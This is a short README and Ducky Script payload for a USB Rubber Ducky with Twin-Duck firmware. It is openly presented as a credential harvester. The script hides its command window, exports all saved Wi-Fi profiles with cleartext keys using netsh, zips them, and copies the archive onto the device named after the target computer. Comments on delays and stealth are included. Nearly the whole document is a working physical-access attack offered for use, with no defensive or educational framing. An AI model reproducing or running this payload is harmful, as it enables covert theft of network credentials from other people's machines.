## Ducky-Credential-Harvester
Short credential harvester for the USB-Rubber-Ducky (Hak5). Requires the Twin-Duck Firmware flashed on it.
TwinDuck: is a Firmware to be flashed on the Ducky via Arduino IDE, wich enables HID and Flashdrive regisstration on the Ducky

--> Enables credential saving on the Ducky itsself

Source: https://github.com/hak5darren/USB-Rubber-Ducky

Guide to Flash TwinDuck: https://www.youtube.com/watch?v=jemPgO_eNeg

REM: these lines arent going to be processed

DELAY 2000

GUI d

REM --> delay for 2 seconds to get the drivers on the target machine running. Closes all Tabs (GUI=WindowsKey)

DELAY 150

GUI r

DELAY 400

STRING cmd

ENTER

DELAY 500

STRING color FE & mode con:cols=18 lines=1

ENTER

REM -->(optional) stealthy...

STRING mkdir A

ENTER

STRING cd A

ENTER

REM --> Sets up the credentials Directory "A" on the Desktop - navigates into it 

STRING netsh wlan export profile key=clear

ENTER

DELAY 200

STRING cd ..

ENTER

REM --> exports all Saved wlan profiles to "A" and navigates back (!!requiers administrative privileges!!)

STRING powershell

ENTER

STRING Compress-Archive -Path A -DestinationPath A.zip

ENTER

STRING copy A.zip D:\%computername%-wifi-passwords.zip

ENTER

GUI d

REM --> Compresses .xml files into .zip via powershell and copys the credentials to the Duckys directory with the targets name in it. Minimizes all tabs.

REM --> Execution time: arround 3-5 seconds. Delays commonly need to be longer the older your target machine is.
